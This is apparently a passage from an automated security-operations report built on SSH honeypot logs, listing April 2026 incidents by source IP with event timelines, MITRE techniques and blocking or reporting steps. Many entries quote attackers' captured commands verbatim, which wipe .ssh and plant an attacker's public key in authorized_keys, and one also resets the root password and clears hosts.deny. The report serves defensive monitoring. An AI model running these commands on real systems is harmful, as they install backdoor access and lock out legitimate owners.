| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:31:14` | `cowrie.session.connect` |
| `2026-04-14 17:31:14` | `cowrie.client.version` |
| `2026-04-14 17:31:14` | `cowrie.client.kex` |
| `2026-04-14 17:31:14` | `cowrie.login.success` |
| `2026-04-14 17:31:14` | `cowrie.session.params` |
| `2026-04-14 17:31:14` | `cowrie.command.input` |
| `2026-04-14 17:31:14` | `cowrie.command.failed` |
| `2026-04-14 17:31:15` | `cowrie.log.closed` |
| `2026-04-14 17:31:15` | `cowrie.session.params` |
| `2026-04-14 17:31:15` | `cowrie.command.input` |
| `2026-04-14 17:31:15` | `cowrie.session.file_download` |
| `2026-04-14 17:31:15` | `cowrie.log.closed` |
| `2026-04-14 17:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41d7ed201d27

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:31 |
| **Last Seen** | 2026-04-14 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:31:17` | `cowrie.session.connect` |
| `2026-04-14 17:31:17` | `cowrie.client.version` |
| `2026-04-14 17:31:17` | `cowrie.client.kex` |
| `2026-04-14 17:31:17` | `cowrie.login.success` |
| `2026-04-14 17:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d65bf1fb62d

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:31 |
| **Last Seen** | 2026-04-14 17:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:31:42` | `cowrie.session.connect` |
| `2026-04-14 17:31:42` | `cowrie.client.version` |
| `2026-04-14 17:31:43` | `cowrie.client.kex` |
| `2026-04-14 17:31:44` | `cowrie.login.success` |
| `2026-04-14 17:31:44` | `cowrie.session.params` |
| `2026-04-14 17:31:44` | `cowrie.command.input` |
| `2026-04-14 17:31:44` | `cowrie.command.failed` |
| `2026-04-14 17:31:44` | `cowrie.log.closed` |
| `2026-04-14 17:31:45` | `cowrie.session.params` |
| `2026-04-14 17:31:45` | `cowrie.command.input` |
| `2026-04-14 17:31:45` | `cowrie.session.file_download` |
| `2026-04-14 17:31:45` | `cowrie.log.closed` |
| `2026-04-14 17:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d032965ac5

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:31 |
| **Last Seen** | 2026-04-14 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:31:48` | `cowrie.session.connect` |
| `2026-04-14 17:31:48` | `cowrie.client.version` |
| `2026-04-14 17:31:48` | `cowrie.client.kex` |
| `2026-04-14 17:31:49` | `cowrie.login.success` |
| `2026-04-14 17:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4121cc85855

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:32 |
| **Last Seen** | 2026-04-14 17:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:32:24` | `cowrie.session.connect` |
| `2026-04-14 17:32:24` | `cowrie.client.version` |
| `2026-04-14 17:32:24` | `cowrie.client.kex` |
| `2026-04-14 17:32:25` | `cowrie.login.success` |
| `2026-04-14 17:32:25` | `cowrie.session.params` |
| `2026-04-14 17:32:25` | `cowrie.command.input` |
| `2026-04-14 17:32:25` | `cowrie.command.failed` |
| `2026-04-14 17:32:25` | `cowrie.log.closed` |
| `2026-04-14 17:32:25` | `cowrie.session.params` |
| `2026-04-14 17:32:25` | `cowrie.command.input` |
| `2026-04-14 17:32:26` | `cowrie.session.file_download` |
| `2026-04-14 17:32:26` | `cowrie.log.closed` |
| `2026-04-14 17:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4018ff56c56b

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:32 |
| **Last Seen** | 2026-04-14 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:32:27` | `cowrie.session.connect` |
| `2026-04-14 17:32:27` | `cowrie.client.version` |
| `2026-04-14 17:32:28` | `cowrie.client.kex` |
| `2026-04-14 17:32:28` | `cowrie.login.success` |
| `2026-04-14 17:32:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20c6e93511b5

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:33 |
| **Last Seen** | 2026-04-14 17:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:33:27` | `cowrie.session.connect` |
| `2026-04-14 17:33:27` | `cowrie.client.version` |
| `2026-04-14 17:33:27` | `cowrie.client.kex` |
| `2026-04-14 17:33:29` | `cowrie.login.success` |
| `2026-04-14 17:33:29` | `cowrie.session.params` |
| `2026-04-14 17:33:29` | `cowrie.command.input` |
| `2026-04-14 17:33:29` | `cowrie.command.failed` |
| `2026-04-14 17:33:30` | `cowrie.log.closed` |
| `2026-04-14 17:33:30` | `cowrie.session.params` |
| `2026-04-14 17:33:30` | `cowrie.command.input` |
| `2026-04-14 17:33:31` | `cowrie.session.file_download` |
| `2026-04-14 17:33:31` | `cowrie.log.closed` |
| `2026-04-14 17:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-532ba44b51d0

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:33 |
| **Last Seen** | 2026-04-14 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:33:34` | `cowrie.session.connect` |
| `2026-04-14 17:33:34` | `cowrie.client.version` |
| `2026-04-14 17:33:34` | `cowrie.client.kex` |
| `2026-04-14 17:33:36` | `cowrie.login.success` |
| `2026-04-14 17:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c493ed5ddd

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:34 |
| **Last Seen** | 2026-04-14 17:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:34:30` | `cowrie.session.connect` |
| `2026-04-14 17:34:30` | `cowrie.client.version` |
| `2026-04-14 17:34:30` | `cowrie.client.kex` |
| `2026-04-14 17:34:30` | `cowrie.login.success` |
| `2026-04-14 17:34:30` | `cowrie.session.params` |
| `2026-04-14 17:34:30` | `cowrie.command.input` |
| `2026-04-14 17:34:30` | `cowrie.command.failed` |
| `2026-04-14 17:34:30` | `cowrie.log.closed` |
| `2026-04-14 17:34:31` | `cowrie.session.params` |
| `2026-04-14 17:34:31` | `cowrie.command.input` |
| `2026-04-14 17:34:31` | `cowrie.session.file_download` |
| `2026-04-14 17:34:31` | `cowrie.log.closed` |
| `2026-04-14 17:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9afe95a89ee0

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:34 |
| **Last Seen** | 2026-04-14 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:34:33` | `cowrie.session.connect` |
| `2026-04-14 17:34:33` | `cowrie.client.version` |
| `2026-04-14 17:34:33` | `cowrie.client.kex` |
| `2026-04-14 17:34:33` | `cowrie.login.success` |
| `2026-04-14 17:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4619a7152a04

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-14 17:34 |
| **Last Seen** | 2026-04-14 17:35 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:FP4YeLWoCwsV"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:34:37` | `cowrie.session.connect` |
| `2026-04-14 17:34:37` | `cowrie.client.version` |
| `2026-04-14 17:34:37` | `cowrie.client.kex` |
| `2026-04-14 17:34:38` | `cowrie.login.success` |
| `2026-04-14 17:34:38` | `cowrie.session.params` |
| `2026-04-14 17:34:38` | `cowrie.command.input` |
| `2026-04-14 17:34:38` | `cowrie.command.failed` |
| `2026-04-14 17:34:38` | `cowrie.log.closed` |
| `2026-04-14 17:34:39` | `cowrie.session.params` |
| `2026-04-14 17:34:39` | `cowrie.command.input` |
| `2026-04-14 17:34:39` | `cowrie.session.file_download` |
| `2026-04-14 17:34:39` | `cowrie.log.closed` |
| `2026-04-14 17:34:51` | `cowrie.session.params` |
| `2026-04-14 17:34:51` | `cowrie.command.input` |
| `2026-04-14 17:34:51` | `cowrie.log.closed` |
| `2026-04-14 17:34:52` | `cowrie.session.params` |
| `2026-04-14 17:34:52` | `cowrie.command.input` |
| `2026-04-14 17:34:52` | `cowrie.log.closed` |
| `2026-04-14 17:34:52` | `cowrie.session.params` |
| `2026-04-14 17:34:52` | `cowrie.command.input` |
| `2026-04-14 17:34:52` | `cowrie.session.file_download` |
| `2026-04-14 17:34:52` | `cowrie.log.closed` |
| `2026-04-14 17:34:53` | `cowrie.session.params` |
| `2026-04-14 17:34:53` | `cowrie.command.input` |
| `2026-04-14 17:34:53` | `cowrie.log.closed` |
| `2026-04-14 17:34:53` | `cowrie.session.params` |
| `2026-04-14 17:34:53` | `cowrie.command.input` |
| `2026-04-14 17:34:53` | `cowrie.log.closed` |
| `2026-04-14 17:34:54` | `cowrie.session.params` |
| `2026-04-14 17:34:54` | `cowrie.command.input` |
| `2026-04-14 17:34:54` | `cowrie.command.input` |
| `2026-04-14 17:34:54` | `cowrie.log.closed` |
| `2026-04-14 17:34:54` | `cowrie.session.params` |
| `2026-04-14 17:34:54` | `cowrie.command.input` |
| `2026-04-14 17:34:55` | `cowrie.log.closed` |
| `2026-04-14 17:34:55` | `cowrie.session.params` |
| `2026-04-14 17:34:55` | `cowrie.command.input` |
| `2026-04-14 17:34:55` | `cowrie.log.closed` |
| `2026-04-14 17:34:56` | `cowrie.session.params` |
| `2026-04-14 17:34:56` | `cowrie.command.input` |
| `2026-04-14 17:34:56` | `cowrie.log.closed` |
| `2026-04-14 17:34:56` | `cowrie.session.params` |
| `2026-04-14 17:34:56` | `cowrie.command.input` |
| `2026-04-14 17:34:56` | `cowrie.log.closed` |
| `2026-04-14 17:34:57` | `cowrie.session.params` |
| `2026-04-14 17:34:57` | `cowrie.command.input` |
| `2026-04-14 17:34:57` | `cowrie.log.closed` |
| `2026-04-14 17:34:57` | `cowrie.session.params` |
| `2026-04-14 17:34:57` | `cowrie.command.input` |
| `2026-04-14 17:34:57` | `cowrie.log.closed` |
| `2026-04-14 17:34:58` | `cowrie.session.params` |
| `2026-04-14 17:34:58` | `cowrie.command.input` |
| `2026-04-14 17:34:58` | `cowrie.log.closed` |
| `2026-04-14 17:34:58` | `cowrie.session.params` |
| `2026-04-14 17:34:58` | `cowrie.command.input` |
| `2026-04-14 17:34:59` | `cowrie.log.closed` |
| `2026-04-14 17:34:59` | `cowrie.session.params` |
| `2026-04-14 17:34:59` | `cowrie.command.input` |
| `2026-04-14 17:34:59` | `cowrie.log.closed` |
| `2026-04-14 17:34:59` | `cowrie.session.params` |
| `2026-04-14 17:34:59` | `cowrie.command.input` |
| `2026-04-14 17:35:00` | `cowrie.log.closed` |
| `2026-04-14 17:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c5c5d41e0a1

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:34 |
| **Last Seen** | 2026-04-14 17:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:34:39` | `cowrie.session.connect` |
| `2026-04-14 17:34:39` | `cowrie.client.version` |
| `2026-04-14 17:34:40` | `cowrie.client.kex` |
| `2026-04-14 17:34:40` | `cowrie.login.success` |
| `2026-04-14 17:34:40` | `cowrie.session.params` |
| `2026-04-14 17:34:40` | `cowrie.command.input` |
| `2026-04-14 17:34:40` | `cowrie.command.failed` |
| `2026-04-14 17:34:40` | `cowrie.log.closed` |
| `2026-04-14 17:34:40` | `cowrie.session.params` |
| `2026-04-14 17:34:40` | `cowrie.command.input` |
| `2026-04-14 17:34:40` | `cowrie.session.file_download` |
| `2026-04-14 17:34:40` | `cowrie.log.closed` |
| `2026-04-14 17:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf2fa4b626d8

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:34 |
| **Last Seen** | 2026-04-14 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:34:42` | `cowrie.session.connect` |
| `2026-04-14 17:34:42` | `cowrie.client.version` |
| `2026-04-14 17:34:42` | `cowrie.client.kex` |
| `2026-04-14 17:34:42` | `cowrie.login.success` |
| `2026-04-14 17:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd5ddf71b68c

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:36 |
| **Last Seen** | 2026-04-14 17:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:36:19` | `cowrie.session.connect` |
| `2026-04-14 17:36:19` | `cowrie.client.version` |
| `2026-04-14 17:36:19` | `cowrie.client.kex` |
| `2026-04-14 17:36:20` | `cowrie.login.success` |
| `2026-04-14 17:36:20` | `cowrie.session.params` |
| `2026-04-14 17:36:20` | `cowrie.command.input` |
| `2026-04-14 17:36:20` | `cowrie.command.failed` |
| `2026-04-14 17:36:20` | `cowrie.log.closed` |
| `2026-04-14 17:36:20` | `cowrie.session.params` |
| `2026-04-14 17:36:20` | `cowrie.command.input` |
| `2026-04-14 17:36:20` | `cowrie.session.file_download` |
| `2026-04-14 17:36:20` | `cowrie.log.closed` |
| `2026-04-14 17:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48885aee2e78

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:36 |
| **Last Seen** | 2026-04-14 17:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
